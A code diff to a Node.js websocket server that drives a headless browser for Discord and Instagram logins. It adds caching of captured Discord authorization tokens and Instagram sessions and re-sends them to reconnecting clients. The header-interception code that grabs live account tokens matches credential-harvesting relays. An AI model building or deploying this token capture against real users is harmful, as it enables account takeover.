@@ -66,6 +66,7 @@ const SVC = {
         browser: null, page: null,
         screenshotInterval: null,
         tokenCaptured: false,
+        capturedToken: null,
         clients: new Set()
     },
     instagram: {
@@ -89,8 +90,8 @@ const server = http.createServer((req, res) => {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({
             ok: true,
-            discord:   { ready: !!SVC.discord.page,   clients: SVC.discord.clients.size,   captured: SVC.discord.tokenCaptured },
-            instagram: { ready: !!SVC.instagram.page, clients: SVC.instagram.clients.size, captured: SVC.instagram.tokenCaptured }
+            discord:   { ready: !!SVC.discord.page,   clients: SVC.discord.clients.size,   captured: SVC.discord.tokenCaptured,   hasCachedToken: !!SVC.discord.capturedToken },
+            instagram: { ready: !!SVC.instagram.page, clients: SVC.instagram.clients.size, captured: SVC.instagram.tokenCaptured, hasCachedSession: !!SVC.instagram.capturedSession }
         }));
         return;
     }
@@ -127,15 +128,39 @@ wss.on('connection', (ws, req) => {
     ws.on('error', () => svc.clients.delete(ws));
 
     ws.on('message', async (raw) => {
-        if (!svc.page) return;
         let msg;
         try { msg = JSON.parse(raw); } catch (_) { return; }
+
+        if (msg.type === 'reset') {
+            if (!svc.tokenCaptured) return;
+            console.log(`[${svcName}] Reset requested — relaunching browser`);
+            svc.tokenCaptured = false;
+            svc.capturedSession = null;
+            svc.capturedToken = null;
+            broadcast(svc, { type: 'status', text: 'Relaunching browser for fresh login...' });
+            try { await closeBrowser(svc, svcName); } catch (_) {}
+            try {
+                await launchBrowser(svcName);
+                startScreenshots(SVC[svcName], svcName);
+            } catch (e) {
+                console.error(`[${svcName}] Relaunch failed:`, e.message);
+                broadcast(svc, { type: 'error', message: 'Failed to relaunch browser.' });
+            }
+            return;
+        }
+
+        if (!svc.page) return;
         await handleInput(svc, msg);
     });
 
-    if (svc.tokenCaptured && svc.capturedSession) {
-        // Re-deliver cached session to clients that lost their localStorage
-        send(ws, { type: 'session', ...svc.capturedSession });
+    if (svc.tokenCaptured) {
+        if (svcName === 'instagram' && svc.capturedSession) {
+            send(ws, { type: 'session', ...svc.capturedSession });
+        } else if (svcName === 'discord' && svc.capturedToken) {
+            send(ws, { type: 'token', token: svc.capturedToken });
+        } else {
+            send(ws, { type: 'status', text: 'Session expired — click Connect to re-login' });
+        }
         return;
     }
     send(ws, { type: 'status', text: 'Connected — log in to continue' });
@@ -218,6 +243,7 @@ function setupDiscordCapture(svc) {
         const auth = request.headers()['authorization'];
         if (auth && auth.length > 20 && !auth.startsWith('undefined')) {
             svc.tokenCaptured = true;
+            svc.capturedToken = auth;
             stopScreenshots(svc);
             console.log('[discord] Token captured!');
             broadcast(svc, { type: 'token', token: auth });
